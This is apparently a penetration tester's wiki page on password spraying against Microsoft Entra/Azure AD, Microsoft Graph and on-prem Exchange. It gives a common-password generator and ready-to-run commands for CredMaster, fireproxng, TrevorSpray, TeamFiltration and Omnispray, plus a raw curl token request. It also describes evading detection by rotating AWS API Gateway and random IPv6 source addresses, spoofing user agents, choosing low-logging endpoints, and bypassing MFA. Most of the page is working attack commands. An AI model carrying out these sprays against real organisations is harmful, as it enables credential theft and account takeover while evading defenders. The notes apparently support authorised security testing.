---
title: Password Spraying
---

[[notes/initial-access/index]] trough insecure passwords.

1. identify services to spray against during [[notes/recon/index]]
2. [[notes/initial-access/user-gathering]]
3. [[notes/initial-access/user-validation]]
4. Test credentials, preferably against legacy software without MFA like [[notes/network/microsoft-exchange]] or websites with NTLM authentication, but also against [[notes/entra/index]] and other cloud services
5. [[notes/entra/conditional-access|Try to bypass MFA]]

Generate a list of common passwords.
Add the city of the company headquarter and variations for other languages.

~~~ bash
exrex "(Summer|Winter|Sommer|Winter|Welcome|Willkommen)($(date +%Y)|$(date -d 'last year' +%Y))\!|(Start|Qwerty|Qwertz|Password|Passwort)123\!"
~~~

# Against Microsoft Cloud

Untested tools:

- [catspin](https://github.com/rootcathacking/catspin), alternative to `fireproxng`
- [RagingRotator](https://github.com/nickzer0/RagingRotator), alternative to `TeamFiltration`
- [gofireprox](https://github.com/mr-pmillz/gofireprox), alternative to `fireproxng`
- [fireprox](https://github.com/ustayready/fireprox), the original

References:

- [CredMaster: Easy & Anonymous Password Spraying](http://web.archive.org/web/20221130205054/https://whynotsecurity.com/blog/credmaster/)
- [Basic authentication in Exchange Online](https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/disable-basic-authentication-in-exchange-online), Basic auth on the web endpoints is disabled globally, except for SMTP
- [twitter.com/rootsecdev/status/1649070894927446020](https://twitter.com/rootsecdev/status/1649070894927446020), Microsoft blocks password spraying for customers with Entra P2 license when the source IPs of the requests belong to the same ISP

## Azure SSSO

Spray against `https://autologon.microsoftazuread-sso.com`.
This produces less logs, but is not supported by all tenants.

=== "[[notes/tools/credmaster]]"
    ~~~ bash
    python3 ./credmaster.py --config ./config.json --color --plugin azuresso -u ./users.txt -p ./passwords.txt -a ./useragents.txt -o ./round1
    ~~~

## AAD Graph

Sprays against `https://graph.windows.net/common/oauth2/token`.

=== "[[notes/tools/credmaster]]"
    ~~~ bash
    python3 ./credmaster.py --config ./config.json --color --plugin msol -u ./users.txt -p ./passwords.txt -a ./useragents.txt -o ./round1
    ~~~

Manually.

~~~ bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_REGION=...
fireproxng list
fireproxng create https://login.windows.net/
curl -sS -H 'Accept: application/json' -H 'User-Agent: Windows-AzureAD-Authentication-Provider/1.0' https://$proxyid.execute-api.eu-west-1.amazonaws.com/fireprox/$tenantid/oauth2/token --data-urlencode resource=https://graph.windows.net -d client_id=38aa3b87-a06d-4817-b275-7a316988d93b -d client_info=1 -d grant_type=password -d scope=openid --data-urlencode username=john.doe@corp.com --data-urlencode password='Start123!'
fireproxng delete $proxyid
~~~

[[notes/tools/trevorspray]] provides a similar capability by using random addresses from large IPv6 subnets.

~~~ bash
trevorspray --prefer-ipv6 --subnet dead:beef::1/48 --random-useragent --url https://login.windows.net/$tenantid/oauth2/token -u ./emails.txt -p 'Start123!'
~~~

## Microsoft Graph

Spray against `https://graph.microsoft.com/common/oauth2/token`.

=== "[[notes/tools/credmaster]]"
    ~~~ bash
    python3 ./credmaster.py --config ./config.json --color --plugin msgraph -u ./users.txt -p ./passwords.txt -o ./round1
    ~~~

    **Warning:** This uses a hardcoded user agent for unknown reasons.

## Microsoft Login

Spray gainst `https://login.microsoftonline.com` with [[notes/tools/teamfiltration]].
Cleanup of AWS API Gateways is a bit unreliable.

=== "[[notes/tools/teamfiltration]]"
    ~~~ bash
    ./TeamFiltration --outpath ./corp --config ./config.json --spray --shuffle-regions --shuffle-users --shuffle-passwords --jitter 5 --sleep-min 90 --sleep-max 120 --passwords ./passwords.txt
    ~~~

# Against Exchange on-prem

Against ActiveSync.

=== "[Omnispray](https://github.com/0xzdh/omnispray)"
    ~~~ bash
    omnispray -m owa_spray_activesync -t spray --url https://mail.corp.com/Microsoft-Server-ActiveSync -d CORP -uf ./emails.txt -p 'Start123!'
    ~~~

    > **Warning:** This tool produced false negatives.

Untested tools:

- [[notes/tools/trevorspray]], Python, against Exchange OWA
- [spraycharles](https://github.com/tw1sm/spraycharles), Python, against Exchange EWS and any HTTP endpoint with NTLM authentication
- [o365spray](https://github.com/0xzdh/o365spray)
- [MailSniper](https://github.com/dafthack/mailsniper), PowerShell, against Exchange OWA and EWS

# Against more targets

- ADFS: TrevorSpray, [ADFSpray](https://github.com/xfreed0m/adfspray)
- Skype for Business: [SprayingToolkit](https://github.com/byt3bl33d3r/sprayingtoolkit)
- Octa: TrevorSpray, CredMaster
- Cisco AnyConnect: TrevorSpray
- Fortinet VPN: CredMaster
